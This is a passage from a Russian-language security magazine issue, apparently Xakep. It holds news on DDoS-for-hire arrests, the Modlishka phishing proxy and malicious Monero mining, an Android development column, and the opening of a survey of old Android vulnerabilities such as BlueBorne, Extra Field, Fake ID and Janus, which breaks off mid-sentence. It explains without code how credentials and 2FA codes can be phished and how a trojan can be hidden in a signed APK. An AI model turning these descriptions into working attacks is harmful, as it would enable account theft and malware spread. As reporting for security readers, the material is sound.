  существовал с 2015 года и пред лагал всем жела ющим (даже если у клиента
   нет какой‐либо технической подготовки) устроить DDoS‐атаку на заданную
   цель. Такая «услуга» обхо дилась пользователям Webstresser всего в 10–
  15 евро в месяц, и за время своего сущес твования сервис поспособствовал
  организа ции примерно 4 миллионов DDoS‐атак.
     Теперь пред ставители Евро пола сообщили, что поч ти год назад им
  при поддержке гол ланд ской и британской полиции удалось получить данные
  о 151 тысяче зарегистрированных пользователей Webstresser. И как выяс‐
   нилось, в последнее время правоохранители активно работали над прив‐
  лечением к ответствен ности кли ентов ныне закрытого сервиса.
    Официальный пресс‐релиз гласит, что бри танская полиция уже «навес‐
   тила» многих пользователей Webstresser и изъяла у них более 60 единиц пер‐
  сональных элек трон ных устройств.
     Голландская полиция и прокуратура и вовсе создали специальный проект
  под названием Hack_Right, призванный защитить малолетних нарушителей,
  совершивших преступле ние впервые. К ним применяют более мягкие формы
  наказа ния, чтобы не подталкивать подростков к более серьезным наруше‐
  ниям законов. Сооб щает ся, что голландские пользователи Webstresser уже
  опробовали эти альтернативные наказания на себе.
     Кроме того, пред ста вите ли Европола обещают, что в самом ближайшем
  будущем еще более 250 бывших клиентов Webstresser и других подоб ных
  сервисов для DDoS‐атак столкнутся с серьезными последствиями своих пос‐
   тупков и понесут ответственность за при чиненный ими ущерб.
     Также пра воохраните ли напоминают, что в конце декабря 2018 года объ‐
  единенными уси лиями США, Бри тании и Нидерландов были закрыты сра‐
   зу 15 крупных сервисов для DDoS‐атак по найму. Об их пользователях власти
  тоже не забыли и обещают «прий ти» за всеми.



        «Мас штаб не важен, поль зователи всех уров ней находят ся под наб-
        людением пра воох ранитель ных орга нов, будь это геймер, решив ший
         выгнать из игры кон курен та, или высокоуровневый хакер, осу щест-
         влявший DDoS-атаки против ком мерчес ких целей ради финансовой
         выгоды», — под черкивают в Евро поле.


  100 000 ВРЕДОНОС НЫХ САЙТОВ УШЛИ В ОФЛАЙН
   Инициатива URLhaus была создана в мар те 2018 года и призвана бороть ся с распростра нени‐
   ем мал вари. Энтузиасты собира ют URL‐адреса активных вредонос ных кам паний и делятся ими,
   чтобы ИБ‐сообщество могло оперативно предпринимать меры, то есть вно сить их в черные
   списки или уво дить в офлайн. Недав но URLhaus под вели про межу точные итоги и опубликовали
   статистику.

  265 специалистов по информационной безопасности обна руживали около 300 вредоносных
   сайтов каж дый день.

   Порядка 2/3 хос тингов малвари рас полага ются в Китае или США.

  В сред нем на отклю чение одного вредоносного сайта уходит 8 дней 10 часов и 24 минуты.

  В таких стра нах, как Китай, обезвре жива ние сайтов занима ет боль ше вре мени и требует уже
  более 30 дней.

   За про шед шие 10 месяцев участникам URLhaus удалось обез вредить около 100 000 вредонос‐
   ных URL.

   15 700 сайтов имели отношение к рас пространению раз ных вер сий Emotet (он же Heodo),
   а еще 12 800 распространяли тро яна Gozi.





 АВТОМАТИЗАЦИЯ
 ФИШИНГА
  Польский ИБ‐специалист Петр Душиньский  (Piotr Duszyński) опубликовал
  на GitHub свою разработку, названную Modlishka. В первую оче редь этот инс‐
   трумент ориентирован  на  пентесте ров, однако  злоумышленники  могут
  использовать его для автоматизации фишинговых атак и даже обхода двух‐
  факторной аутен тификации.
    По сути, Modlishka пред ставляет собой обратный прок си (reverse proxy),
  модифициро ванный специально для работы с трафиком со стра ниц логина
  и для фишин говых операций. Modlishka размещается между жер твой фишера
  и целевым сайтом (Gmail, Yahoo, ProtonMail). Когда пользователь подключает‐
  ся к сер веру Modlishka на фишинговом домене, обратный прокси обра щается
   к нас тояще му сайту, за который пытается себя выдать. В итоге жертва видит
  контент с нас тояще го сайта, однако весь ее трафик при этом проходит через
  сервер Modlishka.
    Любые учетные данные, которые вводит пользователь, автоматически сох‐
  раняются в бэкенде Modlishka. Инструмент помогает даже перехватывать
  введенные пользователем одноразовые коды двух факторной аутентифика‐
   ции, и, если атакующий будет действовать достаточно быс тро, в реальном
  времени, он сможет использовать эти коды для входа в аккаунт жертвы.
     Так как Modlishka не использует никаких шаблонов и работа ет нап рямую
  с целевым сайтом, потенциальному злоумышленни ку не придется тра тить
  время на тонкую настройку и «клонирование» легитимного ресурса. В сущ‐
   ности, понадобится только фишинговый домен и действитель ный TLS‐сер‐
   тификат, чтобы поль зователи не получали пре дупреждений об отсутс твии
  HTTPS.
    Сам  разработчик описыва ет  Modlishka  как  point‐and‐click  решение,
  которое крайне просто нас тро ить и автоматизировать, в отличие от многих
  других фишинговых тулкитов для пентестеров. Инте рес но, что Душиньский
  мало тревожится о том, что его инструментом могут пользоваться не толь ко
  ИБ‐специалис ты, но и прес тупни ки, которым Modlishka может существенно
   облегчить жизнь:



        «Нужно приз нать,  что без работающе го  proof-of-concept, который
         по‑нас тояще му доказы вает [серьезность проблемы], риск так и оста-
         ется теоре тическим и никаких реальных мер не предпри нима ется.
        Дан ный статус‑кво и плохая информи рован ность об угро зе соз дают
        иде аль ные  условия  для  зло умышленников,  которые  будут  рады
         использовать проблему».


  4,3% MONERO ДОБЫТЫ ЗЛО УМЫШЛЕННИ КАМИ


   Специалисты из Мадрид ско го университета име ни Карла III и Королевского колледжа Лондона
   изучили 4 400 000 образцов малвари, собранных с 2007 по 2018 год. Исследователи хотели
   узнать, какое количес тво токенов криптовалю ты Monero (XMR) за последние годы было добыто
   при помощи вредоносных решений для майнин га.


   Добавив к изучен ной мал вари ста тис тику май ниговых пулов и криптовалютных кошель ков,
   экспер ты под счи тали, что за четыре года преступни ки добыли 4,3% всех токенов Monero, что
   равняется при мерно 56 000 000 долларов по курсу на момент публикации отчета. То есть
   вредонос ные майнеры сум марно приносят своим опе раторам порядка 1 200 000 дол ларов
   еже месяч но.





 WHATSAPP ПРОТИВ
 ДЕЗИНФОРМАЦИИ
  Разработчики Facebook и мессенджера WhatsApp, принадлежащего социаль‐
  ной сети, про дол жают борьбу с фальшивыми новостями, то есть с рас‐
  пространением намеренной дезинформации через социаль ные медиа (а
  порой и через обычные СМИ).
    Дело в том, что WhatsApp — один из главных каналов в мире для рас‐
  пространения таких фейков. К примеру, во вре мя прошлогодних выборов
   в Бразилии таким образом распростра нялись самые разные фаль шивки,
  ложный компромат о кан дидатах и многочисленные теории загово ра. Тогда
  более половины из 50 самых популярных и часто пересы лаемых изображений
   в политических группах были признаны фальшивыми, то есть содержали
  гарантированно ложную информа цию.
     Разработчики WhatsApp уже пытались бороться с этой проблемой, одна ко
  до пос ледне го времени ограничения применя лись точечно. К примеру, еще в
  прошлом году в Индии вступило в силу ограниче ние, запрещающее пересы‐
   лать одно сообщение другим пользователям или группам более пяти раз.
  На этот шаг разработчики пошли пос ле того, как через WhatsApp в Индии ста‐
  ли распространяться данные о похище ниях детей, руководствуясь которыми
  разъярен ная тол па линчевала нес кольких человек, что в итоге привело к мас‐
  совым арес там и крупному скандалу.
    В  осталь ном мире  до  недавнего  времени  ограничение  сос тавля‐
  ло 20 пересы лок для одного сообщения. Но теперь агентство Reuters сооб‐
  щило, что ограничение на пересылку одного сообщения не более пяти раз
  было решено применить для всех пользователей мессенджера во всех стра‐
   нах (напом ню, что поль зовательская база WhatsApp насчитывает поряд‐
   ка 1,5 миллиарда человек). Разработчики говорят, что сначала ограниче ние
  заработает для пользователей Android, а в самом скором будущем также
  появится в WhatsApp для iOS.


  ДРУГИЕ ИНТЕРЕСНЫЕ СОБЫТИЯ МЕСЯЦА

   Приватные репози тории GitHub станут бесплатными


  В некоторых моделях смартфонов Alcatel наш ли малварь


  Обновле ния вновь выз вали проблемы в работе Windows


   При сме не номера телефона можно уви деть чужие сообщения в WhatsApp


   Хакер, едва не оста вив ший без интернета целую страну, получил тюремный срок


   Во всех имплементациях SCP за последние 36 лет содержались уязвимости


   Из‐за уяз вимос ти в системе бронирования пос традала 141 авиакомпания


   Роскомнадзор воз будит административные дела про тив Facebook и Twitter


   Найдены уяз вимос ти в распространенных про шив ках для Wi‐Fi SoC


   Facebook бло кировала сторонние инструменты для изу чения политической рекламы
HEADER
ANDROID





     ЧЕГО ОЖИДАТЬ ОТ ANDROID Q,
    ЧТО ВНУТРИ СЕВЕРОКОРЕЙСКОГО
      СМАРТФОНА И ЧТО ТАКОЕ
    КОНТЕКСТНО ОРИЕНТИРОВАННОЕ
     ПРОГРАММИРОВАНИЕ В KOTLIN





Сегодня в выпус ке: рассказ о решении
некоторых проб лем безопасности в Android
Q, раз бор работы новой сис темы обновле‐
ния Android APEX, реверс северокорей ско‐
го смар тфо на, вве дение в контекстно ори‐          Евгений Зобнин                                                                                      Редактор Unixoid и Mobile
ентированное программирование на Kotlin,              zobnin@glc.ru
а так же советы по работе с GitHub и работе
с Google Play Console.


                ПОЧИТАТЬ


Чего ожидать в Android Q
Android Q May Block Background Clipboard Reads, Better Protect Your Media
Files, Support Downgrading Apps, and more — жур налис ты XDA Developers про‐
должают изучать непонятно как попавшую к ним раннюю сбор ку Android Q.
  Ранее они уже рассказывали о новом шриф те, изменяемых цветовых схе‐
мах, тем ной теме интерфейса, а также о новом полномочии для приложений,
которое позволит отключать доступ к мес тоположению, когда приложение
находится в фоне (разрешение ACCESS_BACKGROUND_LOCATION, примерно
такое же есть в iOS).
   Теперь они рассказывают о более низ коуровневых вещах:
 1. Запрет на чтение буфера обме на в фоне. В Android любое приложе ние
  может прочитать буфер обмена безо всяких разрешений. Это security‐
  фейл из‐за ошибки проектирования: читать буфер обмена приложениям
   нужно, чтобы поль зователь смог скопировать текст в их поле вво да. Судя
   по всему, инженеры Google не придума ли, как без болез ненно устра нить
   этот недочет, поэто му решили хотя бы частично обезопасить пользовате‐
   лей, введя новое разрешение — READ_CLIPBOARD_IN_BACKGROUND .
   Без этого разрешения приложения не смогут читать буфер обмена,
   находясь в фоне, а получить его может только системный софт из состава
   прошивки.
 2. Воз можность даунгрейдить при ложения. В Android Q появятся дос‐
   тупные только приложениям из комплекта прошивки разрешения PACK
  AGE_ROLLBACK_AGENT и MANAGE_ROLLBACKS , а у команды pm , поз воля‐
  ющей уста нав ливать и удалять приложения из командной строки, появится
   флаг enablerollback . Это сви детельство,  что добавится  воз‐
   можность отка тить ся до ста рых версий при ложе ния.
 3. Ог раничение на доступ к файлам на кар те памяти. Сейчас, имея раз‐
  решения READ_EXTERNAL_STORAGE и WRITE_EXTERNAL_STORAGE , при‐
   ложения могут читать всю кар ту памяти целиком, включая любые файлы,
   не принадлежащие самому приложению. Так сделано потому, что в картах
   памяти используется файловая сис тема без раз граничения пол номочий,
   а также потому, что бесполезно разграничивать доступ на носителе,
   который в любой момент можно вынуть и прочитать все данные. Android Q
   позволит разгра ничить доступ к файлам на уровне их типов; появят ся раз‐
  решения READ_MEDIA_AUDIO , READ_MEDIA_VIDEO и READ_MEDIA_IM
  AGES .


Мо дульный Android
APEX in Android Q: What Could Be The Biggest Thing Since Project Treble —
статья об APEX, новой подсистеме Android, которая должна смягчить проб‐
лему с обновле ниями ОС в будущем.
   Как мы все знаем, Google испытыва ет огромные проблемы с обновле‐
ниями Android. Только малая часть про изводителей соглашается поддержи‐
вать устройства в течение хотя бы двух лет. Остальные же выпускают на рынок
смартфон и переходят к разработке нового. А старое устройство если уж
и обновля ется, то с очень большими задержка ми.
   Чтобы как‐то решить эту проблему, Google уже реализова ла идею патчей
безопасности и инициировала Project Treble. Последний раз деляет Android
на две независимые части, которые можно обновлять отдельно друг от дру га.
Идея здесь в том, что обычно проблемы с обновлениями возникают из‐за
производителей оборудования, которые отказыва ются обновлять драйверы
своих устройств для новых вер сий Android. Project Treble позволяет обновлять
ОС, не затрагивая драйверы и ядро Android.
  Однако на этом Google не останови лась. В Android Q Google собирается
внедрить подсисте му APEX, которая поз волит обновлять куски Android даже
в обход про изводителя устройства. По своей сути APEX — это пакетный
менеджер, очень похожий на тот, что исполь зуется в дистрибути вах Linux
и новой опе рационке Google Fuchsia. Работает он примерно так: допустим,
по оче редному указу правитель ства в России вновь изменяют часовые пояса.
Команда раз работ чиков Android формирует новую версию пакета с часовыми
поясами и выкладывает ее в Google Play. Пользователи получают обновле‐
ние — все счастливы.





                   Содержимое пакета APEX

Таким же обра зом могут быть обновлены библиотеки и целые подсистемы.
Уже сейчас в AOSP доступны пакеты с ран таймом ART («виртуальная
машина», ответственная за запуск приложений) и библиотека криптогра‐
фических алгоритмов conscrypt. В теории в пакет APEX можно упаковать
практически любой компонент сис темы, и поль зователи смогут обновить его
независимо от производителя смартфона.
  Интересно, что APEX не производит обновление «на живую», когда старый
компонент заменяется на новый. Раздел /system в Android недоступен
для записи, поэтому APEX использует трюк с монтированием. Все обновля‐
емые фай лы внутри пакета APEX находятся в образе файловой сис темы ext4.
Когда происходит «установка» пакета, система монтирует этот образ поверх
раздела /system в режиме bind. В результате файлы пакета как бы заменяют
оригиналь ные файлы Android, хотя в реальности все остается на сво их мес‐
тах.
   Точно такой же трюк использует Magisk для уста новки модификаций An‐
droid без изменения раздела /system. И его автор уже сказал, что APEX ста‐
нет проблемой для Magisk.





                 Процесс «установ ки» пакета APEX


Что внут ри корейского Android
Hacking North Korea’s Android — презентация, посвященная взлому северо‐
корейского смартфона Pyongyang 2407. Инте ресные факты:
 • В устройстве используется материнская плата WBW5511, такая же, как в
  BLU  Life Play 2 и некоторых других смартфонах. Чипсет — Mediatek
   MT6582.
 • Как и мно гие другие устройства Север ной Кореи, смар тфон работает
   на уста ревшей версии Android: 4.2.2 Jellybean с интерфей сом в стиле ста‐
   рых вер сий iOS.
 • Браузер залочен на местный интранет Kwangmyong. Wi‐Fi отключен пол‐
   ностью, но имеется поддержка местных 3G/CDMA‐провайдеров Koryolink,
   Kang Song и Byol.
 • Смартфон использует систему DRM, которая позволяет прос матривать,
   прослушивать и читать файлы, либо созданные на самом устрой стве, либо
  одобренные правительством Северной Кореи (для этого исполь зуют ся
  цифровые подписи RSA2048). Если закинуть виде оклип на карту памяти,
   устройство откажется его воспроизводить.
 • Система логирует все попытки открыть неподписанные файлы.
 • Проверка на доступ к файлам осуществляется на низком уровне (нельзя
   установить сторонний файловый менеджер и открыть файл), но ее легко
   взломать.





                Pyongyang 2407 собственной персоной


              РАЗРАБОТЧИКУ


Нес коль ко простых советов
Tips  I wish  I had when  I started with Android apps — семь простых советов
начина ющему разработчику, с которыми я как более‐менее опытный раз‐
работчик полностью сог ласен.
 1. Тща тель но работай над каждой версией. Ты удивишься, уви дев, что спустя
   несколько лет люди все еще используют версию приложения, которую ты
   выпустил вчера. Пос тарайся сделать так, чтобы эта версия даже через
   несколько лет работала стабильно: сохраняй совместимос ти API бэкен да
   и тщательно тестируй каждую новую версию.
 2. Сто рон ние магази ны при ложе ний — потеря времени. Публикация при‐
   ложения за пределами Google Play тебе вряд ли что‐то даст, но отнимет
  массу вре мени.
 3. Продажа при ложения, возможно, не лучший способ его монетизации.
   Если ты собираешься посвятить под держке своего при ложения много
   времени,  развивая  его  в  течение  нескольких  лет,  стоит  подумать
  о монетизации с помощью подписки.
 4. Crash reporting — наше все. Обязательно исполь зуй сервис для сбора
   отчетов об ошибках или вкладку Android Vitals в консоли разработ чика
   Google Play. Ты можешь сколь угодно долго тестировать при ложение,
   но всегда найдется немало странных смартфо нов, на которых оно будет
   крашиться.
 5. Не поддавайся соблазну зарабо тать больше. Любой начина ющий раз‐
   работчик,  при ложе ние  которого  пользуется  спросом,  задумывается
  об интеграции большего количества рекламных баннеров и повышении
   цены. Будь осторожен, реклама не должна отвле кать и мешать исполь‐
   зованию приложе ния. Иначе ты рискуешь потерять всю базу пользовате‐
   лей.
 6. Регулярно обновляй приложение. Забыв о своем детище на пол года‐год,
   ты можешь удивить ся, как трудно его обновить, если, например, изме нят‐
   ся пра вила Google Play. Биб лиоте ки устаревают, инструменты обновля‐
   ются, а ты получаешь множество несовместимостей одновременно.
 7. Слу шай пользовате лей. Любой отзыв о приложении важен. Просто отве‐
   тив на него, а еще лучше выпол нив просьбу авто ра, ты можешь получить
  множество дополнительных установок и избежать деинсталляций.


Кон текс тно ориентированное прог раммирова ние в Kotlin
An introduction to context‐oriented programming in Kotlin — несмотря на гром‐
кое желтушное наз вание, интересная и полез ная статья об особенностях
Kotlin, позволя ющих решать задачи, для которых они, казалось бы, не пред‐
назна чены.
  Первая  особенность —  функции‐рас ширения,  которые  позволяют
добавить свой собственный метод в любой класс, независимо от того, есть
у разработ чика доступ к его исходному коду или нет (пример: fun String.
doSomthing() {}). Вторая — блоки области действия, которые позволяют
выполнять код в контек сте того или иного объ екта без указания его имени
(пример: with (string) { doSomthing() }).
  Объединив их вместе, мы получим неожиданный резуль тат:


class B
class A{
    fun B.doBSomething(){}
}
fun main(){
    val a = A()
    val b = B()
    with(a){
        b.doBSomething() // Так можно
    }
    b.doBSomething() // А так нельзя
}

Но что это дает? Возможность писать код, который будет работать по‐раз‐
ному в зависимости от контекста. Взгляни на следующий пример:


interface NumberOperations{
    operator fun Number.plus(other: Number) : Number
    operator fun Number.minus(other: Number) : Number
    operator fun Number.times(other: Number) : Number
    operator fun Number.div(other: Number) : Number
}
object DoubleOperations: NumberOperations{
    override fun Number.plus(other: Number) = this.toDouble() + other
.toDouble()
    override fun Number.minus(other: Number) = this.toDouble() ‐
other.toDouble()
    override fun Number.times(other: Number) = this.toDouble() *
other.toDouble()
    override fun Number.div(other: Number) = this.toDouble() / other.
toDouble()
}
fun main(){
    val n1: Number = 1.0
    val n2: Number = 2
    val res = with(DoubleOperations){
        (n1 + n2)/2
    }
    println(res)
}

Этот код показы вает, как выполнять математические операции над чис лами
по правилам типа Double. Если программисту понадобится выполнить их
по пра вилам другого типа, он может создать дру гой «контекст» и указать его
в аргу мен те функции with.


Советы по работе с GitHub
8 Productivity Tips for GitHub — краткая статья с восемью дельными совета ми
по работе с GitHub.
 1. Быс трый поиск по репозиторию. Открой любой репозиторий, нажми t
   и начни вво дить имя файла. Появит ся выпадающий список, по которому ты
  сможешь переме щать ся с помощью стрелок.
 2. Пред ложения в pull-реквестах. При ком менти ровании pull‐реквеста ты
  можешь предложить альтер натив ный код, разместив его в markdown‐бло‐
   ке кода с тегом suggestion .
 3. Удобная навига ция по исходному коду. Chrome‐плагин Octotree добав‐
   ляет на стра ницы репозиториев сайдбар, с помощью которого можно
   «ходить» по репозиторию так же, как ты делаешь это в IDE.
 4. Пры жок к фун кции во время code review. Во время ревью кода из pull‐
   реквеста ты в любой момент можешь нажать t и ввести имя функции,
   к которой ты хочешь переместиться.
 5. Постоянная ссылка на файл или  каталог. При прос мотре файла
   или каталога нажми y , чтобы получить постоянную ссылку, гарантиру ющую,
   что, даже если в будущем файл исчезнет из репози тория, его всегда мож‐
   но будет найти по ссылке.
 6. Кто изменял файл? Просматри вая файл, ты можешь нажать b , чтобы уви‐
   деть, кто и как давно изменял каждую строчку файла. Более све жие изме‐
   нения будут отмечены более ярким цветом.
 7. По иск по репозиторию. Нажми / , чтобы выполнить поиск по репози‐
   торию. Ана лог клика по строке поиска слева сверху.
 8. Шаблоны ответов. Если тебе надоело каждый раз писать один и тот же
   ответ в комментариях, просто создай заготовку с помощью опции Saved
    replies.





                       Сайдбар Octotree


Читшит по стандартным фун кциям Kotlin





Источник: medium.com


              БИБЛИОТЕКИ


 • GradleKotlinConverter — скрипт для упрощения миграции фай лов Gradle
   на Kotlin;
 • ChocoBar — расширенная кастомизированная версия снекбара (Snack‐
    bar), информационного сообщения в нижней части экрана;
 • syndication — написанная на Kotlin библиотека для пар синга фидов RSS
   2.0 и ATOM 1.0;
 • CarMarker‐Animation — анимация автомобиля, дви жущегося по кар те;
 • Eiﬀel —  легковесная библиотека для управления состояниями  View
   с использовани ем Jetpack Architecture Components;
 • TrackEyes — приложение‐при мер, способ ное отслеживать движение глаз
   с помощью Google Vision API;
 • Kissme — мультиплатформенная Kotlin‐библиотека для сохранения пар
   ключ:зна чение в зашифрованном виде (поддерживается Android и iOS);
 • Tri‐State‐Checkbox — чекбокс с тре мя сос тояниями;
 • currency‐edittext — EditText для вво да сумм в различных валютах.
 COVERSTORY

   ЗАБЫТЫЕ
  АНДРОИДЫ
     САМЫЕ ОПАСНЫЕ УЯЗВИМОСТИ
      В СТАРЫХ ВЕРСИЯХ ANDROID





                                         Валентин Холмогоров
                                                    valentin@holmogorov.ru





  Как  извес тно, операци онные системы  раз рабатываются
 людьми. Кое‐кто, впрочем, уверен, что Android соз дали реп‐
  тило иды, однако это не так: в мобиль ной платформе Google
 на  сегод няшний  день  обна ружено множес тво оши бок,
 допустить которые могли только представители вида homo
  sapiens. Некоторые из этих багов представ ляют собой пол‐
 ноцен ные уяз вимос ти и могут использовать ся как для несан‐
  кционированного дос тупа к файловой сис теме смартфо на,
  так и для распространения вредонос ного ПО.





  Если верить офи циальной статистике Google, на сегодняшний день среди
  версий Android наиболее распространена Nougat — редакция мобильной
  платформы за номером 7.0 и 7.1 уста новлена в совокупности на 28,2%
  устройств. Вторую позицию уверенно занимает Android 8.0 и 8.1 Oreo
  с показа телем 21,5%. На третьем месте закрепилась шестая версия Marsh‐
  mallow — она работает на 21,3% девайсов. Android 5.0 и 5.1 Lollipop уста нов‐
  лены сум марно на 17,9% устройств, а замыкает груп пу лидеров Android 4.4
  KitKat с показателем 7,6% пользовате лей.
    Согласно информации с сайта cvedetails.com, на сегодняшний день в An‐
  droid насчитывается 2146 уязвимостей, при этом чис ло выявленных багов
  начало экспо нен циально расти примерно с 2014 года.





  Не так просто оценить, сколько из перечисленных устройств вов ремя получи‐
  ли патчи безопасности, которые закрывают уяз вимости, но это явно далеко
  не все из них. Мало того: не все уязвимости вооб ще оказываются закрытыми,
  тем более в ста рых версиях, официальная поддержка которых прекращена.
  Проблему   усу губляют  производители  устройств,  которые  зачастую
  не торопятся выпускать обновления.


                           Android Самая пер вая уяз вимость
  Самая пер вая уязвимость Android была обнаружена еще в октябре 2008 года
  в прошивке коммуникатора HTC T‐Mobile G1. При просмотре веб‐страниц
  с определенным содер жимым ошибка в ПО позволяла выполнить вре донос‐
  ный код, отслежива ющий использование клавиатуры гаджета. Теоретически
  таким образом можно было реализовать кейлог гер, фиксиру ющий нажатия
  кнопок, и собирать вводимую поль зователем при веб‐сер финге информа‐
  цию. Эта уязвимость представ ляла опасность только для одной‐единствен‐
  ной модели коммуника тора, но само ее наличие  наглядно  показа ло:
  Android — не настолько безопасная и защищенная система, как считалось
  ранее.


 С ростом популяр ности операционной системы энту зиасты и исследователи
  отыскивали все новые и новые баги в различных ее версиях. Безусловно,
  в рамках одной статьи мы не сможем охва тить все две тысячи с лишним уяз‐
  вимостей, обна руженных за все время существования Android. Поэтому сос‐
  редоточимся толь ко на самых инте ресных и опасных из них, при чем — только
  в актуальных на данный момент версиях Android (тех, что сей час еще могут
  встретиться в жиз ни).
    Самым «дырявым» оказалось четвертое поколение Android, начиная с вер‐
  сии 4.4 KitKat. С него, пожалуй, и нач нем наш обзор уязвимостей, выявленных
  в разное вре мя в этой платформе.

 BLUEBORNE


• CVE: CVE‐2017‐1000251, CVE‐2017‐1000250, CVE‐2017‐0781, CVE‐2017‐0782,
  CVE‐2017‐0785 и CVE‐2017‐0783
• Уяз вимые вер сии Android: 4.4.4, 5.0.2, 5.1.1, 6.0, 6.0.1, 7.0, 7.1.1, 7.1.2, 8.0
• Для экс плу атации требует ся: атакующий должен находиться на рас сто‐
  янии не более десяти метров от уязвимого устройства, а на уязвимом устрой‐
  стве должен быть включен Bluetooth
• Воз можный резуль тат: выполнение про изволь ного кода с привилегиями
  ядра сис темы, утечка данных



  Это не отдельная уязвимость, а целый набор ошибок в стеке Bluetooth сов‐
  ременных операци онных систем, сре ди которых числится и Android. Серь‐
  езные баги содержатся в коде системной функции l2cap_parse_conf_rsp
  ядра Linux, причем их можно обна ружить во всех версиях ядра, начиная с 3.3.
  Если в сис теме вклю чена защита от переполнения стека CONFIG_CC_STACK‐
  PROTECTOR, их использование приводит к возникновению критичес кой ошиб‐
  ки в работе ядра.
     Уязвимость CVE‐2017‐1000251 выявлена в модуле ядра под названием L2‐
  CAP, который отве чает за работу стека протокола Bluetooth. Еще одна уяз‐
  вимость в стеке этого протоко ла получила обозначение CVE‐2017‐0783. Если
  на ата куемом девай се вклю чена подсистема Bluetooth, с их помощью можно
  удаленно передать на него специальным обра зом сформированные пакеты
  информа ции. Такие пакеты могут содер жать вре доносный код, который
  выполнится в Android с привилегиями ядра системы. При этом для реали‐
  зации атаки не потребуется предварительно соп рягать устройства или вклю‐
  чать на них режим обнаружения. Дос таточно, чтобы ата кующий находился
  на рас стоянии не более десяти метров от уязвимого устройства.
    Поскольку вза имо действующие с про токолом Bluetooth компоненты ОС
  по умолчанию име ют высокие системные привиле гии, эксплу атация этих уяз‐
  вимостей теоретически позволяет получить полный кон троль над атакуемым
  смартфоном и план шетом, включая доступ к хранящим ся на устройстве дан‐
  ным, подключенным сетям и файловой сис теме. Также с помощью BlueBorne
  технически можно реализовы вать атаки типа man‐in‐the‐middle.
    К BlueBorne также относят уязвимость CVE‐2017‐1000250 в сте ке BlueZ
  Linux‐реализации про токола Service Discovery Protocol (SDP). Экс плуата ция
  уязвимости CVE‐2017‐1000250 может при вес ти к утечке данных. Уязвимости
  CVE‐2017‐0781, CVE‐2017‐0782 и CVE‐2017‐0785 относятся к самой ОС An‐
  droid, при этом с помощью первых двух вредоносное приложение может
  получить в системе привилегии ядра, а последняя позволяет реализовать
  утечку дан ных.
    Для устра нения уязвимостей BlueBorne 9 сен тября 2017 года ком пания
  Google выпус тила обновление безопасности. Также они не страш ны устрой‐
  ствам, на которых используется режим Bluetooth Low Energy.

 EXTRA FIELD


• CVE: нет
• Уяз вимые вер сии Android: 2.3, 4.0, 4.1, 4.2, 4.3, 4.4
• Для экс плу атации требует ся: модифицирован ное приложе ние
• Воз можный резуль тат: выполнение про изволь ного кода



  Все приложения для Android распространяются в фор мате .APK и представ‐
  ляют собой ZIP‐архив с тем отличием, что они имеют специаль ную цифровую
  подпись. Внутри находятся необходимые для работы ком поненты, которые
  в процессе установки приложения извлекают ся, а их контрольные сум мы про‐
  веряются по эталон ным значениям. С помощью уязвимости Extra Field зло‐
  умышленник может изменить содержимое установочного пакета APK, не пов‐
  редив его цифровую подпись.
     Внутри архива .APK располага ется файл classes.dex, в котором содер‐
  жится ском пилированный код приложения и набор служебных полей. Среди
  них есть:
   • поле, хранящее имя файла с расширением;
   • размер фай ла;
   • поле Extra Field, в котором записан сам исполняемый код;
   • таблица со спис ком используемых им классов.

  Если в поле заголов ка записать исходное значение без пер вых трех байт,
  значение дли ны поля Extra Field также изменится, благодаря чему появляется
  возможность дописать туда произвольный код, например перечислить клас‐
  сы,  используемые  троянской  частью приложения. После  это го можно
  добавить в архив, помимо оригинального classes.dex, его вредоносную
  копию, часть кода которой будет храниться в «расширенном» поле Extra Field
  оригиналь ного classes.dex. При установке программы система прочитает
  содержимое видо изме ненных полей, и, поскольку в них перечис лены классы
  из модифицированного classes.dex, на устройство будет установлен именно
  этот файл.
     Таким образом, уязвимость позволяет «подсадить» троянца в любое
  легитимное при ложе ние с валид ной цифровой подписью, разве что размер
  вредоносного модуля будет ограничен максималь ным размером файла
  classes.dex  в  65  533  байт.  Уязвимость  была  обнаружена  в  начале
  июля 2013 года и была устранена в версиях Android, выпущенных позже этой
  даты.

 FAKE ID


• CVE: нет
• Уяз вимые вер сии Android: 2.2, 2.3, 4.0, 4.1, 4.2, 4.3, 4.4
• Для экс плу атации требует ся: приложение, подписанное специальным
  образом сформированной цифровой подписью
• Воз можный резуль тат: установка и запуск вредоносного приложения,
  утечка дан ных



  Эту уяз вимость обнаружили в Android 2.2, и она была актуальна вплоть
  до версии 4.4. Ошибка, соот ветствующая этой уязвимости, получила внут‐
  ренний номер 13678484 и в основном устранялась патчами, которые выпус‐
  кали сами производите ли устройств.
     Как уже упоминалось, все .APK‐файлы в Android исполь зуют цифровую
  подпись. Под пись приложения может быть взаимос вязана с цифровой под‐
  писью издателя программы. Все эти под писи используют инфраструктуру
  открытых клю чей PKI (Public Key Infrastructure). С помощью цифровой подписи
  операционная система определя ет, какие возможнос ти и привилегии могут
  быть у при ложения, с какими компонентами ОС оно может взаимодей ство‐
  вать, какие системные фун кции использовать, имеет ли оно право скачивать
  и устанав ливать обновления и так далее.
    Применяемые при проверке подписи приложения цифровые сертификаты
  (электронные докумен ты, в которых хранится цифровой ключ) издаются спе‐
  циальными удостоверяющими центрами. Если сис тема доверяет удостоверя‐
 ющему центру, она автоматически доверяет и всем изданным им сер тифика‐
  там, которые использует приложение.
    При проверке (валидации) цифровой подписи приложения операционная
  система использует открытый ключ разработчика программы. Чтобы убе дить‐
  ся в дей стви тельнос ти этого клю ча, требуется выполнить проверку соот ветс‐
  твующего сертификата удос товеряюще го цен тра. Это называется проверкой
  цепочки сер тификатов. Уязвимость заключа ется в том, что в процессе уста‐
  новки приложения ранние версии Android не выполняли такую проверку вов‐
  се.
    В качестве практической реализации уязвимости можно привести такой
  пример. Если приложе ние подписано двумя цифровыми сер тификатами: под‐
  линным и поддель ным, то при его установке будет соз дана цифровая под‐
  пись, использующая оба сертификата. В резуль тате приложение сможет,
  например, скачивать и устанавливать вредоносные обновления, которые
  не будут проверяться на безопасность, если разработчик под пишет их
  с помощью того же недостоверного сертификата.

 JANUS


• CVE: CVE‐2017‐13156
• Уяз вимые вер сии Android: 5.1.1, 6.0, 6.0.1, 7.0, 7.1.1, 7.1.2
• Для экс плу атации требует ся: модифицирован ное приложе ние
• Воз можный резуль тат: установка и запуск вредоносного приложения,
  утечка дан ных



  Еще одна уязвимость за номером CVE‐2017‐13156, опе рирующая с циф‐
  ровыми подписями приложений Android, только акту аль на она для более све‐
  жих вер сий операционной системы — 5.1.1, 6.0, 6.0.1, 7.0, 7.1.1 и 7.1.2.
 С исполь зованием Janus мож но внедрить в .APK‐архив исполняемый dex‐
